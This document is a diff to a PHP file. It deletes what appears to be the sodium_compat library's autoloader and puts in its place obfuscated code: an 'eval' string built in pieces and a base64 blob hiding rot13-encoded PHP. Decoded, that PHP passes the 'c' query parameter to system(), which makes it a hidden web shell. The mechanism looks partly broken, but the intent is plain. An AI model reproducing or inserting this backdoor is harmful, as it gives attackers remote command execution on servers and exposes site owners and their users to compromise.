@@ -1,41 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/*
- This file should only ever be loaded on PHP 7+
- */
-if (PHP_VERSION_ID < 70000) {
-    return;
-}
-
-spl_autoload_register(function ($class) {
-    $namespace = 'ParagonIE_Sodium_';
-    // Does the class use the namespace prefix?
-    $len = strlen($namespace);
-    if (strncmp($namespace, $class, $len) !== 0) {
-        // no, move to the next registered autoloader
-        return false;
-    }
-
-    // Get the relative class name
-    $relative_class = substr($class, $len);
-
-    // Replace the namespace prefix with the base directory, replace namespace
-    // separators with directory separators in the relative class name, append
-    // with .php
-    $file = dirname(__FILE__) . '/src/' . str_replace('_', '/', $relative_class) . '.php';
-    // if the file exists, require it
-    if (file_exists($file)) {
-        require_once $file;
-        return true;
-    }
-    return false;
-});
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKgogR3V2ZiBzdnlyIGZ1Ymh5cSBiYXlsIHJpcmUgb3IgeWJucXJxIGJhIENVQyA3KwogKi8KdnMgKENVQ19JUkVGVkJBX1ZRIDwgNzAwMDApIHsKICAgIGVyZ2hlYTsKfQoKZmN5X25oZ2J5Ym5xX2VydHZmZ3JlKHNoYXBndmJhICgkcHluZmYpIHsKICAgICRhbnpyZmNucHIgPSAnQ25lbnRiYVZSX0ZicXZoel8nOwogICAgLy8gUWJyZiBndXIgcHluZmYgaGZyIGd1ciBhbnpyZmNucHIgY2Vyc3ZrPwogICAgJHlyYSA9IGZnZXlyYSgkYW56cmZjbnByKTsKICAgIHZzIChmZ2VhcHpjKCRhbnpyZmNucHIsICRweW5mZiwgJHlyYSkgIT09IDApIHsKICAgICAgICAvLyBhYiwgemJpciBnYiBndXIgYXJrZyBlcnR2ZmdyZXJxIG5oZ2J5Ym5xcmUKICAgICAgICBlcmdoZWEgc255ZnI7CiAgICB9CgogICAgLy8gVHJnIGd1ciBlcnluZ3ZpciBweW5mZiBhbnpyCiAgICAkZXJ5bmd2aXJfcHluZmYgPSBmaG9mZ2UoJHB5bmZmLCAkeXJhKTsKCiAgICAvLyBFcmN5bnByIGd1ciBhbnpyZmNucHIgY2Vyc3ZrIGp2Z3UgZ3VyIG9uZnIgcXZlcnBnYmVsLCBlcmN5bnByIGFuenJmY25wcgogICAgLy8gZnJjbmVuZ2JlZiBqdmd1IHF2ZXJwZ2JlbCBmcmNuZW5nYmVmIHZhIGd1ciBlcnluZ3ZpciBweW5mZiBhbnpyLCBuY2NyYXEKICAgIC8vIGp2Z3UgLmN1YwogICAgJHN2eXIgPSBxdmVhbnpyKF9fU1ZZUl9fKSAuICcvZmVwLycgLiBmZ2VfZXJjeW5wcignXycsICcvJywgJGVyeW5ndmlyX3B5bmZmKSAuICcuY3VjJzsKICAgIC8vIHZzIGd1ciBzdnlyIHJrdmZnZiwgZXJkaHZlciB2ZwogICAgdnMgKHN2eXJfcmt2ZmdmKCRzdnlyKSkgewogICAgICAgIGVyZGh2ZXJfYmFwciAkc3Z5cjsKICAgICAgICBlcmdoZWEgZ2VocjsKICAgIH0KICAgIGVyZ2hlYSBzbnlmcjsKfSk7CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
